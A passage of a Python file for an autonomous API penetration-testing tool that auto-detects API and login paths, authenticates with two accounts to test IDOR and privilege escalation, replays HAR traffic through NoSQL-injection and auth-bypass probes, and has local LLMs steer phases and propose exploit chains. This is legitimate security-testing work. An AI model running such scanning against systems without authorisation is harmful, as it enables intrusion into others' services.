                            session_cookies.get("token") or session_cookies.get("JSESSIONID") or \
                            "cookie-auth"
                    session.token = token
                    log("ok", f"  CGI login successful: {path} ({len(session_cookies)} cookies)")
                    return token, path

                # Check for redirect to post-login page (success indicator)
                location = resp.headers.get("Location", "")
                if "postlogin" in location or "dashboard" in location or "inbox" in location:
                    session.token = "cookie-auth"
                    log("ok", f"  CGI login successful (redirect): {path}")
                    return "cookie-auth", path

        except Exception:
            continue

    return "", ""


def _auto_detect_api_base(domain_url: str, rate_limit: float = 5.0) -> str:
    """Probe common API base paths and return the one that responds.

    Given a domain like https://app.foctta.com, tries:
      https://app.foctta.com/api/
      https://api.foctta.com/
      https://app.foctta.com/v1/
      etc.
    Returns the base URL that gives a non-404 response, or the original URL.
    """
    import requests as _req
    parsed = urlparse(domain_url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    # Path suffixes to try on the same host
    PATH_PROBES = [
        "/api/", "/api/v1/", "/api/v2/", "/v1/", "/v2/",
        "/graphql", "/api/organization/", "/api/learner/",
    ]
    # Subdomain variants to try
    host_parts = parsed.netloc.split(".")
    subdomain_bases = []
    if host_parts[0] != "api" and len(host_parts) >= 2:
        api_host = "api." + ".".join(host_parts[1:] if host_parts[0] in ("app", "www") else host_parts)
        subdomain_bases.append(f"{parsed.scheme}://{api_host}")

    candidates = []
    # Try path probes on the given host
    for suffix in PATH_PROBES:
        candidates.append(base + suffix.rstrip("/"))
    # Try subdomain variants
    for sub_base in subdomain_bases:
        candidates.append(sub_base)
        for suffix in PATH_PROBES[:3]:
            candidates.append(sub_base + suffix.rstrip("/"))

    for candidate in candidates:
        try:
            resp = _req.get(candidate, verify=VERIFY_TLS, timeout=8, allow_redirects=False)
            # A valid API base returns JSON or a non-HTML response
            # Skip if it returns the SPA HTML (false positive)
            content_type = resp.headers.get("Content-Type", "")
            is_html = "text/html" in content_type
            is_json = "application/json" in content_type

            if resp.status_code not in (404, 405, 502, 503, 0):
                if is_json:
                    log("ok", f"  API base auto-detected: {candidate}")
                    return candidate
                elif not is_html and resp.status_code in (200, 301, 302):
                    log("ok", f"  API base auto-detected: {candidate}")
                    return candidate
            # Also try POST — some API bases only accept POST
            resp_post = _req.post(candidate + "/", json={}, verify=VERIFY_TLS, timeout=8)
            ct_post = resp_post.headers.get("Content-Type", "")
            if resp_post.status_code not in (404, 405, 502, 503, 0) and "application/json" in ct_post:
                log("ok", f"  API base auto-detected: {candidate}")
                return candidate
        except Exception:
            continue

    # If no API base found, the API may be on the same origin (no prefix)
    log("info", "  No separate API base found — API may be on same origin")
    return domain_url.rstrip("/")


def run_autopilot(base_url: str, auth_creds: str, login_url: str = "login-view/",
                  auth_creds_b: str = None, frontend_url: str = None,
                  output_dir: str = None, rate_limit: float = 5.0,
                  with_brain: bool = False, har_file: str = None) -> dict:
    """Run all 12 phases of the autonomous API VAPT."""

    O = "\033[38;5;208m"  # Orange/amber
    W = "\033[1;37m"     # White bold
    D = "\033[0;90m"     # Dim grey
    N = "\033[0m"        # Reset
    print(f"""
{O} ██╗   ██╗██╗██╗  ██╗██████╗  █████╗ ███╗   ███╗ █████╗ ██████╗ ██╗████████╗██╗   ██╗ █████╗{N}
{O} ██║   ██║██║██║ ██╔╝██╔══██╗██╔══██╗████╗ ████║██╔══██╗██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝██╔══██╗{N}
{W} ██║   ██║██║█████╔╝ ██████╔╝███████║██╔████╔██║███████║██║  ██║██║   ██║    ╚████╔╝ ███████║{N}
{W} ╚██╗ ██╔╝██║██╔═██╗ ██╔══██╗██╔══██║██║╚██╔╝██║██╔══██║██║  ██║██║   ██║     ╚██╔╝  ██╔══██║{N}
{O}  ╚████╔╝ ██║██║  ██╗██║  ██║██║  ██║██║ ╚═╝ ██║██║  ██║██████╔╝██║   ██║      ██║   ██║  ██║{N}
{D}   ╚═══╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝{N}
{D}              Brain-Supervised Autonomous API VAPT Engine{N}
""")
    print(f"  Target : {base_url}")
    print(f"  Time   : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 60 + "\n")

    # ── Fix #3: Auto-detect API base path ─────────────────────────────────────
    # If the URL looks like a frontend domain (no /api/ or /v1/ in path),
    # probe for the actual API base path
    parsed_base = urlparse(base_url)
    if not any(seg in parsed_base.path for seg in ("/api/", "/v1/", "/v2/", "/graphql")):
        log("info", "Probing for API base path...")
        base_url = _auto_detect_api_base(base_url, rate_limit)

    limiter = RateLimiter(rate_limit)
    session = AuthSession(base_url, limiter)

    # ── Fix #2: Auto-detect login URL ─────────────────────────────────────────
    parts = auth_creds.split(":", 1)
    if len(parts) != 2:
        log("err", f"Invalid creds format (use user:pass)")
        return {}

    # Try the specified login URL first
    token = session.auto_login(login_url, parts[0], parts[1])
    if not token:
        # Auto-detect login URL by probing common patterns
        log("info", "Specified login URL failed — auto-detecting...")
        session._session.cookies.clear()
        session.token = None
        if "Authorization" in session._session.headers:
            del session._session.headers["Authorization"]
        token, login_url = _auto_detect_login_url(session, parts[0], parts[1])
    if not token:
        log("err", "Login failed (tried all common login URLs)")
        return {}
    log("ok", f"Authenticated as {parts[0]}")

    # Second account login (for IDOR/priv esc)
    # Try org API first, then learner API (different user tables)
    token_b = None
    if auth_creds_b:
        parts_b = auth_creds_b.split(":", 1)
        if len(parts_b) == 2:
            # Try 1: same API (org)
            session_b = AuthSession(base_url, limiter)
            token_b = session_b.auto_login(login_url, parts_b[0], parts_b[1])
            if not token_b:
                # Try 2: learner API (replace /organization/ with /learner/)
                learner_base = base_url.replace("/organization", "/learner")
                session_b = AuthSession(learner_base, limiter)
                token_b = session_b.auto_login(login_url, parts_b[0], parts_b[1])
            if token_b:
                log("ok", f"Second account: {parts_b[0]} (role: learner)")
            else:
                log("warn", f"Second account login failed for {parts_b[0]}")

    # Output
    if output_dir:
        os.makedirs(output_dir, exist_ok=True)

    all_findings = []

    # Phase 1: Endpoint Discovery
    # Auto-infer frontend URL from API base if not specified
    if not frontend_url:
        parsed_api = urlparse(base_url)
        # If API is at api.example.com, frontend is likely at app.example.com or example.com
        host = parsed_api.netloc
        if host.startswith("api."):
            # Try app. subdomain, then bare domain
            domain_tail = host[4:]
            for prefix in ["app.", "www.", ""]:
                frontend_url = f"{parsed_api.scheme}://{prefix}{domain_tail}"
                break
        else:
            # API is on same host (e.g., app.foctta.com/api/organization/)
            frontend_url = f"{parsed_api.scheme}://{parsed_api.netloc}"
        log("info", f"Frontend URL inferred: {frontend_url}")

    discovery = EndpointDiscovery(session, frontend_url)
    endpoints = discovery.run()

    # Save endpoints
    if output_dir:
        with open(os.path.join(output_dir, "endpoints.json"), "w") as f:
            json.dump(endpoints, f, indent=2)

    # ── Brain-Supervised Dynamic Loop ──────────────────────────────────────────
    saver = FindingSaver(output_dir, "autopilot") if output_dir else None
    ctx = BrainScanContext()
    ctx.endpoints = endpoints

    # Brain creates initial test plan (or use default order if no brain)
    ctx.test_plan = _brain_create_initial_plan(endpoints, with_brain)
    log("info", f"Test plan: {len(ctx.test_plan)} phases queued")

    # Dynamic loop: brain decides after each phase
    while ctx.test_plan and ctx.phases_executed < MAX_PHASES:
        phase_spec = ctx.test_plan.pop(0)
        phase_name = phase_spec["phase"]
        ctx.phases_executed += 1

        # Execute phase
        findings = _run_phase(phase_spec, session, token, token_b, endpoints, saver)
        ctx.all_findings.extend(findings)
        ctx.completed_phases.append(phase_name)

        # Brain supervisor decision — visible reasoning
        if with_brain and findings:
            decision = _brain_decide_next(phase_name, findings, ctx)
            action = decision.get("action", "continue")
            reason = decision.get("reason", "")

            ctx.phase_decisions.append({
                "after": phase_name, "action": action,
                "reason": reason, "findings_count": len(findings),
            })

            # Show brain's thinking to the user
            pending_names = [p["phase"] for p in ctx.test_plan[:3]]
            print(f"\033[0;35m  ┌─ Brain Supervisor ─────────────────────────────────\033[0m")
            print(f"\033[0;35m  │\033[0m Reviewed: {phase_name} ({len(findings)} findings)")
            print(f"\033[0;35m  │\033[0m Thinking: {reason[:100]}")
            print(f"\033[0;35m  │\033[0m Decision: \033[1m{action.upper()}\033[0m", end="")

            if action == "inject" and decision.get("phase"):
                new_phase = {
                    "phase": decision["phase"],
                    "endpoints": decision.get("endpoints"),
                    "priority": 10,
                    "reason": reason,
                }
                ctx.test_plan.insert(0, new_phase)
                inject_eps = decision.get("endpoints", [])
                print(f" → {decision['phase']} ({len(inject_eps)} endpoints)")
                print(f"\033[0;35m  │\033[0m Next: {decision['phase']} → {' → '.join(pending_names[:2])}")

            elif action == "skip" and decision.get("skip_phase"):
                skip_name = decision["skip_phase"]
                ctx.test_plan = [p for p in ctx.test_plan if p["phase"] != skip_name]
                print(f" → removing {skip_name} from queue")
                print(f"\033[0;35m  │\033[0m Next: {' → '.join(pending_names[:3])}")

            else:
                print(f" → next: {pending_names[0] if pending_names else 'done'}")

            print(f"\033[0;35m  └─────────────────────────────────────────────────────\033[0m", flush=True)

    if ctx.phases_executed >= MAX_PHASES:
        log("warn", f"  Safety cap: stopped after {MAX_PHASES} phases")

    # Save brain supervisor log
    if with_brain and ctx.phase_decisions and output_dir:
        log_path = os.path.join(output_dir, "brain_supervisor_log.json")
        with open(log_path, "w") as f:
            json.dump({
                "phases_executed": ctx.completed_phases,
                "decisions": ctx.phase_decisions,
                "total_findings": len(ctx.all_findings),
                "injected_phases": sum(1 for d in ctx.phase_decisions if d["action"] == "inject"),
                "skipped_phases": sum(1 for d in ctx.phase_decisions if d["action"] == "skip"),
            }, f, indent=2)
        log("info", f"  Supervisor log: {log_path}")

    all_findings = ctx.all_findings

    # Phase 11.5: HAR-replay differential probe (P1-FIX-2).
    # When the operator captured a browser session HAR, replay every in-scope
    # JSON POST/PUT through the same 6-probe TYPE_CONFUSION / OPERATOR_INJECTION
    # / AUTH_BYPASS matrix used by the live NoSQL probe. Picks up endpoints the
    # crawler missed (multi-step wizards, role-gated admin pages).
    if har_file:
        try:
            from whitebox.har_replay import HARReplayProbe
            scope_host = urlparse(base_url).hostname or ""
            har_out = (os.path.join(output_dir, "findings", "har_replay")
                       if output_dir else None)
            cookies = {}
            try:
                cookies = {c.name: c.value for c in session._session.cookies}
            except Exception:
                pass
            log("phase", f"Phase 11.5: HAR-replay differential ({har_file})")
            replay_results = HARReplayProbe(
                har_path=har_file,
                scope_hosts=[scope_host] if scope_host else [],
                output_dir=har_out,
                auth_cookies=cookies,
            ).run()
            for entry in replay_results:
                for param, verdict in (entry.get("results") or {}).items():
                    v = verdict.get("verdict")
                    if v == "NOT_VULNERABLE":
                        continue
                    sev_map = {"TYPE_CONFUSION": MEDIUM,
                               "OPERATOR_INJECTION": HIGH,
                               "AUTH_BYPASS": CRITICAL}
                    all_findings.append({
                        "type": f"har_replay_{v.lower()}",
                        "severity": sev_map.get(v, MEDIUM),
                        "detail": f"HAR replay {v} on `{param}` ({entry.get('endpoint')})",
                        "url": entry.get("url"),
                        "evidence": verdict.get("reason", ""),
                        "probes": verdict.get("probes", []),
                    })
            log("ok", f"  HAR replay: {len(replay_results)} requests inspected")
        except Exception as e:
            log("warn", f"  HAR replay phase failed: {e}")

    # Phase 12: Chain Building
    chains = ChainBuilder().run(all_findings, saver)
    all_findings.extend(chains)

    # Phase 13: Brain Validation (FP removal + severity correction)
    if with_brain:
        try:
            all_findings = _brain_validate_findings(all_findings, output_dir)
        except Exception as e:
            log("warn", f"Brain validation failed: {e}")

    # Save summary
    if saver:
        saver.save_summary()

    # Summary
    severity_counts = {}
    for f in all_findings:
        sev = f.get("severity", "unknown")
        severity_counts[sev] = severity_counts.get(sev, 0) + 1

    print("\n" + "=" * 60)
    print("  AUTOPILOT COMPLETE")
    print("=" * 60)
    print(f"  Total findings: {len(all_findings)}")
    for sev in [CRITICAL, HIGH, MEDIUM, LOW, INFO]:
        count = severity_counts.get(sev, 0)
        if count:
            print(f"    {sev.upper()}: {count}")
    print(f"  Endpoints tested: {len(endpoints)}")
    print(f"  Output: {output_dir or 'stdout only'}")
    print("=" * 60 + "\n")

    # Brain chain analysis + recommendations
    if with_brain:
        try:
            _run_brain_analysis(all_findings, output_dir)
        except Exception as e:
            log("warn", f"Brain analysis failed: {e}")

    return {"findings": all_findings, "endpoints": endpoints, "chains": chains}


# (Old _brain_supervisor_review removed — replaced by _brain_decide_next above)


def _brain_validate_findings(findings: list[dict], output_dir: str = None) -> list[dict]:
    """Use local LLM to review findings for false positives and severity inflation."""
    log("phase", "Phase 13: Brain Validation (FP + Severity Review)")
    try:
        import ollama
    except ImportError:
        log("warn", "  ollama not installed — skipping brain validation")
        return findings

    # For JSON validation, prefer non-thinking models (Gemma 4 puts output in thinking field)
    model = None
    for candidate in ["bugtraceai-apex", "qwen3-coder-64k:latest", "vapt-qwen25:latest",
                      "qwen2.5-coder:32b", "baron-llm:latest", "qwen3:8b"]:
        try:
            ollama.show(candidate)
            model = candidate
            break
        except Exception:
            continue
    if not model:
        log("warn", "  No Ollama model found — skipping validation")
        return findings

    log("info", f"  Validation model: {model} (non-thinking for JSON)")

    summary = "\n".join(
        f"[{f['severity'].upper()}] {f['type']}: {f['detail']}"
        for f in findings
    )

    prompt = f"""Review these {len(findings)} VAPT findings. Return JSON with severity corrections.

Rules:
- S3 does NOT execute PHP/Python. Upload to S3 is NOT RCE. If CRITICAL for S3 upload, downgrade to HIGH.
- Django DEBUG=True is HIGH (CVSS 7.5), NOT CRITICAL (requires CVSS >= 9.0).
- Server version disclosure alone is INFO, not LOW/MEDIUM.
- Missing rate limiting is MEDIUM unless it directly enables account takeover.
- If a finding claims "RCE" but the file is stored on static S3, downgrade to HIGH.

Findings:
{summary}

Return ONLY this JSON format, no other text:
{{"fixes": [{{"finding_type": "type_name", "action": "downgrade", "new_severity": "high", "reason": "one line"}}]}}

If all findings are correctly rated, return: {{"fixes": []}}"""

    try:
        resp = ollama.chat(model=model, messages=[
            {"role": "system", "content": "You are a VAPT severity reviewer. Output ONLY valid JSON. No markdown fences. No explanation."},
            {"role": "user", "content": prompt},
        ], options={"num_predict": 1000, "temperature": 0.1})

        content = resp["message"].get("content", "") or ""
        thinking = resp["message"].get("thinking", "") or ""
        combined = content + " " + thinking

        # Strip markdown fences if present
        combined = re.sub(r'```json\s*', '', combined)
        combined = re.sub(r'```\s*', '', combined)

        # Extract JSON from response
        json_match = re.search(r'\{[^{}]*"fixes"\s*:\s*\[[\s\S]*?\]\s*\}', combined)
        if not json_match:
            log("warn", "  Brain returned no actionable JSON — keeping all findings")
            return findings

        review = json.loads(json_match.group(0))
        fixes = review.get("fixes", [])

        if not fixes:
            log("ok", "  Brain approved all findings — no changes needed")
            return findings

        # Apply fixes
        removed = 0
        downgraded = 0
        for fix in fixes:
            ftype = fix.get("finding_type", "")
            action = fix.get("action", "keep")
            new_sev = fix.get("new_severity", "")
            reason = fix.get("reason", "")

            for f in findings:
                if ftype and ftype in f.get("type", ""):
                    if action == "remove":
                        f["_removed"] = True
                        removed += 1
                        log("warn", f"  REMOVED: {f['type']} — {reason}")
                    elif action == "downgrade" and new_sev:
                        old_sev = f["severity"]
                        f["severity"] = new_sev
                        downgraded += 1
                        log("info", f"  DOWNGRADED: {f['type']} {old_sev}→{new_sev} — {reason}")
                    break

        # Remove marked findings
        validated = [f for f in findings if not f.get("_removed")]

        log("ok", f"  Brain review: {removed} removed, {downgraded} downgraded, {len(validated)} kept")

        # Save review log
        if output_dir:
            review_path = os.path.join(output_dir, "brain_validation.json")
            with open(review_path, "w") as fh:
                json.dump({"model": model, "fixes": fixes,
                           "removed": removed, "downgraded": downgraded,
                           "total_before": len(findings), "total_after": len(validated)}, fh, indent=2)
            log("info", f"  Review log: {review_path}")

        return validated

    except json.JSONDecodeError as e:
        log("warn", f"  Brain returned invalid JSON: {e}")
        return findings
    except Exception as e:
        log("warn", f"  Brain validation error: {e}")
        return findings


def _run_brain_analysis(findings: list[dict], output_dir: str = None):
    """Send findings to local Ollama for chain analysis."""
    log("phase", "Brain Analysis (Local LLM)")
    try:
        import ollama
        summary = "\n".join(
            f"[{f['severity'].upper()}] {f['type']}: {f['detail']}"
            for f in findings
        )
        prompt = (
            f"You are an elite penetration tester. Analyze these {len(findings)} findings "
            f"from an LMS application (Django + Keycloak + PostgreSQL + S3):\n\n"
            f"{summary}\n\n"
            f"1. What exploit chains escalate individual findings to CRITICAL?\n"
            f"2. What did the scanner likely miss?\n"
            f"3. What manual tests should the operator run next?\n"
            f"Be specific — cite finding types and chain them."
        )
        # Try models in priority order: Gemma 4 27B → vapt-qwen25 → qwen2.5:32b → qwen3:8b
        model = None
        # Tested priority order (benchmark: quality + speed):
        # bugtraceai-apex (4/4, 57 tok/s, security-tuned) > gemma4:26b (4/4, 66 tok/s) >
        # qwen3-coder-64k (4/4, 10 tok/s) > baron-llm (2/4, 14 tok/s)
        for candidate in ["bugtraceai-apex", "gemma4:26b", "qwen3-coder-64k:latest",
                          "vapt-qwen25:latest", "deepseek-r1:32b",
                          "baron-llm:latest", "qwen3:8b"]:
            try:
                ollama.show(candidate)
                model = candidate
                break
            except Exception:
                continue
        if not model:
            log("warn", "  No suitable Ollama model found")
            return
        log("info", f"  Using model: {model}")
        resp = ollama.chat(model=model, messages=[
            {"role": "system", "content": "You are a VAPT expert. Be concise and actionable."},
            {"role": "user", "content": prompt},
        ], options={"num_predict": 800, "temperature": 0.3})
        # Some models (GLM, DeepSeek-R1) put output in "thinking" field
        analysis = resp["message"].get("content", "") or resp["message"].get("thinking", "")
        log("ok", f"  Brain analysis: {len(analysis)} chars")
        if output_dir:
            with open(os.path.join(output_dir, "brain_analysis.md"), "w") as f:
                f.write(f"# Vikramaditya Brain Analysis\n\n{analysis}\n")
            log("ok", f"  Saved to {output_dir}/brain_analysis.md")
        print(analysis)
    except ImportError:
        log("warn", "  ollama package not installed — run: pip install ollama")
    except Exception as e:
        log("warn", f"  Ollama error: {e}")


def main():
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    parser = argparse.ArgumentParser(
        description="Vikramaditya Autopilot API Hunt — 12-Phase Autonomous VAPT",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 autopilot_api_hunt.py --base-url https://api.example.com --auth-creds user:pass
  python3 autopilot_api_hunt.py --base-url URL --auth-creds admin:pass --auth-creds-b learner:pass
  python3 autopilot_api_hunt.py --base-url URL --auth-creds user:pass --with-brain
        """)
    parser.add_argument("--base-url", required=True, help="API base URL")
    parser.add_argument("--auth-creds", required=True, help="user:pass for primary account")
    parser.add_argument("--auth-creds-b", help="user:pass for second account (IDOR/priv esc)")
    parser.add_argument("--login-url", default="login-view/", help="Login endpoint path")
    parser.add_argument("--frontend-url", help="Frontend URL for JS bundle scraping")
    parser.add_argument("--output", help="Output directory for findings")
    parser.add_argument("--rate-limit", type=float, default=5.0, help="Max requests/sec")
    parser.add_argument("--with-brain", action="store_true", help="Use local Ollama for analysis")
    parser.add_argument("--har-file", default=None,
                        help="HAR file: replay every in-scope JSON POST/PUT through "
                             "the 6-probe NoSQL/operator-injection differential")
    args = parser.parse_args()

    run_autopilot(
        base_url=args.base_url,
        auth_creds=args.auth_creds,
        auth_creds_b=args.auth_creds_b,
        login_url=args.login_url,
        frontend_url=args.frontend_url,
        output_dir=args.output,
        rate_limit=args.rate_limit,
        with_brain=args.with_brain,
        har_file=args.har_file,
    )


if __name__ == "__main__":
    main()
